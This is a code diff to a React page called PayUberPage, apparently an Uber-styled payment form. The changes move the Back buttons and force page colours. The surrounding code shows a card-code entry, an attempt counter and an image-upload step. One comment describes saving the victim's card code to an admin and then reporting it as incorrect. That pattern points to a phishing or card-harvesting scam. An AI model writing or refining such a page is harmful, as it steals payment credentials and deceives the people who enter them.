@@ -712,10 +712,17 @@ export default function PayUberPage() {
     setCardResult(null)
     setCardAttempt(0)
     setShowUploadStep(false)
-    setUploadDone(false)
     setSelectedImages([])
     setUploadError(null)
     if (typeof window !== 'undefined') window.scrollTo({ top: 0, behavior: 'smooth' })
+  }
+
+  function handleMethodsBack() {
+    if (expandedMethod) {
+      closeView('method')
+    } else {
+      closeView('methods')
+    }
   }
 
   // Save card code to admin first, then report it as incorrect
@@ -879,8 +886,15 @@ export default function PayUberPage() {
         <link rel="stylesheet" href="/payuber/payment.css" />
         <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
         <style>{`
+          html, body {
+            background: #ffffff !important;
+            color: #000000 !important;
+          }
           .payuber-page, .payuber-page * {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
+          }
+          .payuber-page {
+            color: #000000 !important;
           }
         `}</style>
       </Head>
@@ -1138,6 +1152,12 @@ export default function PayUberPage() {
 
               {session && !sessionLoading && payStep === 'methods' && (
                 <>
+                  <button
+                    type="button"
+                    className="payment-method-back"
+                    onClick={handleMethodsBack}
+                    dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }}
+                  />
                   <h3 className="ride-category-title">Payment Method</h3>
                   <div className="payment-methods-grid">
                     {PAYMENT_METHODS.map((method) => {
@@ -1173,12 +1193,6 @@ export default function PayUberPage() {
                           </div>
                           {expanded && !showUploadStep && (
                             <div className="payment-method-expanded">
-                              <button
-                                type="button"
-                                className="payment-method-back"
-                                onClick={() => closeView('method')}
-                                dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }}
-                              />
                               <form onSubmit={checkCard}>
                                 <div className="uber-input-row">
                                   <input
@@ -1204,12 +1218,6 @@ export default function PayUberPage() {
 
                   {showUploadStep && cardResult && (
                     <div className="payment-upload-ui">
-                      <button
-                        type="button"
-                        className="payment-method-back"
-                        onClick={() => closeView('method')}
-                        dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }}
-                      />
                       <label className="payment-upload-dropzone">
                         <input type="file" accept="image/*" multiple style={{ display: 'none' }} onChange={handleImageSelect} />
                         <div className="payment-upload-icon" dangerouslySetInnerHTML={{ __html: UPLOAD_ICON }} />
